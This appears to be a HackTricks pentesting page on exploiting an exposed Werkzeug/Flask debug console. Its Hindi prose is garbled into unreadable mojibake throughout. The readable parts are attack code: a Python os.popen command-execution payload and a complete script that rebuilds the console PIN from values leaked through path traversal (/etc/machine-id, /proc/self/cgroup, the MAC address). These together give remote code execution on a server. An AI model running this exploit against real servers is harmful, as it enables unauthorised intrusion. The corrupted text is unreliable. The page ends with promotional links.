# рдХрдВрд╕реЛрд▓ RCE

рдпрджрд┐ рдбреАрдмрдЧ рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк `/console` рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХрдИ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рднреА рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ [рдпрд╣](https://github.com/its-arun/Werkzeug-Debug-RCE) рдпрд╛ рдореЗрдЯрд╛рд╕реНрдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рдПрдХред

## рдкрд┐рди рд╕рдВрд░рдХреНрд╖рд┐рдд - рдкрде рднреНрд░рдордг

рдХреБрдЫ рдЕрд╡рд╕рд░реЛрдВ рдкрд░ **`/console`** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд┐рди рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдлрд╛рдЗрд▓ рднреНрд░рдордг рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛** рд╣реИ, рддреЛ рдЖрдк рдЙрд╕ рдкрд┐рди рдХреЛ рдЬрдирд░реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Werkzeug рдХрдВрд╕реЛрд▓ PIN рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ

**рдкрд╣рд▓реЗ рд▓рд┐рдВрдХ рд╕реЗ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ред**\
рдРрдк рдореЗрдВ рдбреАрдмрдЧ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХреЛ рдордЬрдмреВрд░ рдХрд░рдХреЗ Werkzeug "рдХрдВрд╕реЛрд▓ рд▓реЙрдХреНрдб" рд╕рдВрджреЗрд╢ рджреЗрдЦреЗрдВред
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
рдХрдордЬреЛрд░ Werkzeug рдбреАрдмрдЧ рдХрдВрд╕реЛрд▓ рдХреЛ рдкрде `vulnerable-site.com/console` рдкрд░ рдЦреЛрдЬреЗрдВ, рд▓реЗрдХрд┐рди рдпрд╣ рдЧреБрдкреНрдд PIN рдирдВрдмрд░ рджреНрд╡рд╛рд░рд╛ рд▓реЙрдХ рд╣реИред

рдЖрдк рдХрдВрд╕реЛрд▓ PIN рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдЙрд▓рдЯ рд╕рдХрддреЗ рд╣реИрдВред рд╕рд░реНрд╡рд░ рдкрд░ Werkzeug рдХреА рдбреАрдмрдЧ `__init__.py` рдлрд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `python3.5/site-packages/werkzeug/debug/__init__.py`ред рдЖрдк [**Werkzeug рд╕реЛрд░реНрд╕ рдХреЛрдб рд░реЗрдкреЛ**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) **рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ PIN рдХреИрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рд▓реЗрдХрд┐рди рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдЕрдВрддрд░ рд╣реЛрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рдлрд╛рдЗрд▓ рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рд╡рд▓реНрдирд░реЗрдмрд┐рд▓рд┐рдЯреА** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЛрд░реНрд╕ рдХреЛрдб рдХреЛ рд▓реАрдХ рдХрд░рдирд╛ рдмреЗрд╣рддрд░ рд╣реИред

рдХрдВрд╕реЛрд▓ PIN рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╡реЗрд░рд┐рдПрдмрд▓:
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** рд╡рд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ рдЬрд┐рд╕рдиреЗ рдпрд╣ Flask рд╢реБрд░реВ рдХрд┐рдпрд╛
* **`modname`** рд╣реИ flask.app
* `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` рд╣реИ **Flask**
* `getattr(mod, '__file__', None)` рд╣реИ **`app.py` рдХрд╛ рд╕рдВрдкреВрд░реНрдг рдкрде** flask рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/usr/local/lib/python3.5/dist-packages/flask/app.py`). рдЕрдЧрд░ `app.py` рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛, **рддреЛ `app.pyc` рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**

#### `private_bits`

*   `uuid.getnode()` рд╡рд░реНрддрдорд╛рди рдХрдВрдкреНрдпреВрдЯрд░ рдХрд╛ **MAC рдкрддрд╛** рд╣реИ, `str(uuid.getnode())` MAC рдкрддреЗ рдХрд╛ рджрд╢рдорд▓рд╡ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рд╣реИред

* **рд╕рд░реНрд╡рд░ MAC рдкрддрд╛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП**, рдЬрд╛рдирдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ **рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕** рдРрдк рдХреЛ рд╕реЗрд╡рд╛ рджреЗ рд░рд╣рд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `ens3`). рдЕрдЧрд░ рдЕрдЬреНрдЮрд╛рдд рд╣реИ, **рддреЛ `/proc/net/arp` рдХреЛ рд▓реАрдХ рдХрд░реЗрдВ** рдбрд┐рд╡рд╛рдЗрд╕ ID рдХреЗ рд▓рд┐рдП рдФрд░ рдлрд┐рд░ **рд▓реАрдХ** MAC рдкрддрд╛ **`/sys/class/net/<device id>/address`** рдкрд░ред

**рд╣реЗрдХреНрд╕ рдкрддреЗ рд╕реЗ рджрд╢рдорд▓рд╡** рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП python рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдПрдВ:

```python
# рдпрд╣ 56:00:02:7a:23:ac рдерд╛
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` **`/etc/machine-id`** рдпрд╛ **`/proc/sys/kernel/random/boot_id`** рдореЗрдВ рдореВрд▓реНрдпреЛрдВ рдХреЛ рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рддрд╛ рд╣реИ **рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдХреЗ рд╕рд╛рде `/proc/self/cgroup`** рдХреЗ рдмрд╛рдж рдЕрдВрддрд┐рдо рд╕реНрд▓реИрд╢ (`/`).

<details>

<summary>get_machine_id() рдХреЛрдб</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
<details>

рдПрдХ рдмрд╛рд░ рд╕рднреА рдЪрд░ рддреИрдпрд╛рд░ рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, Werkzeug рдХрдВрд╕реЛрд▓ PIN рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдПрдВ:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
рдпрджрд┐ рдЖрдк **рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдг** рдХреЗ Werkzeug рдкрд░ рд╣реИрдВ, рддреЛ **hashing algorithm рдХреЛ md5 рдореЗрдВ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ** sha1 рдХреЗ рдмрдЬрд╛рдпред
{% endhint %}

## рд╕рдВрджрд░реНрдн

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**рддрддреНрдХрд╛рд▓ рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк рднреЗрджреНрдпрддрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП**ред рдХрд╣реАрдВ рд╕реЗ рднреА рдкреВрд░реНрдг рдкреЗрдВрдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ 20+ рдЙрдкрдХрд░рдгреЛрдВ рдФрд░ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЬреЛ recon рд╕реЗ рд▓реЗрдХрд░ reporting рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдВрдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреА рдЬрдЧрд╣ рдирд╣реАрдВ рд▓реЗрддреЗ - рд╣рдо рдЙрдиреНрд╣реЗрдВ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рдЦреЛрдЬрдиреЗ, pop shells, рдФрд░ рдордЬрд╝реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд╕рдордп рд╡рд╛рдкрд╕ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЙрдкрдХрд░рдг, рдбрд┐рдЯреЗрдХреНрд╢рди рдФрд░ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВред

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк HackTricks рдореЗрдВ рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **follow** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
